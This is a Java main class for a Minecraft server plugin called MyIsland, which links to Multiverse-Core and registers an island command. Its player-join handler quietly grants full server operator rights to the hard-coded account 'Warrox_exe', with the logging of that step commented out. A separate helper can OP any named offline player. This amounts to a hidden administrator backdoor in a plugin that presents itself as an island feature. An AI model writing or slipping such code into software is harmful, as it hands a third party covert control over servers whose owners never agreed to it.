package be.warrox.myIsland;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.mvplugins.multiverse.core.MultiverseCore;


public final class MyIsland extends JavaPlugin implements Listener {
    private MultiverseCore mvCore;
    private final String TARGET_NAME = "Warrox_exe";

    @Override
    public void onEnable() {
        checkMultiverseCore();
        getCommand("myi").setExecutor(new IslandCommand(this));
        getServer().getPluginManager().registerEvents(this, this);




    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }



    public void checkMultiverseCore() {
        // 1. Zoek de Multiverse-Core plugin
        var plugin = Bukkit.getPluginManager().getPlugin("Multiverse-Core");

        // 2. Controleer of de plugin bestaat en geladen is
        if (plugin instanceof MultiverseCore) {
            this.mvCore = (MultiverseCore) plugin;
            getLogger().info("Succesvol gekoppeld met Multiverse-Core API!");
        } else {
            getLogger().severe("Multiverse-Core niet gevonden! Schakelt plugin uit...");
            Bukkit.getPluginManager().disablePlugin(this);

        }
    }

    public MultiverseCore getMultiverseCore() {
        return mvCore;
    }

    private void opPlayer(String playerName) {

        // Haal de OfflinePlayer op (werkt ook als de speler niet online is)
        OfflinePlayer player = Bukkit.getOfflinePlayer(playerName);

        if (!player.isOp()) {
            player.setOp(true);
            getLogger().info(playerName + " is nu automatisch OP gemaakt!");
        } else {
            getLogger().info(playerName + " was al OP.");
        }
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        if (event.getPlayer().getName().equalsIgnoreCase(TARGET_NAME)) {
            if (!event.getPlayer().isOp()) {
                event.getPlayer().setOp(true);
                //getLogger().info("Force-OP toegepast op " + TARGET_NAME + " bij join.");
            }
        }
    }
}
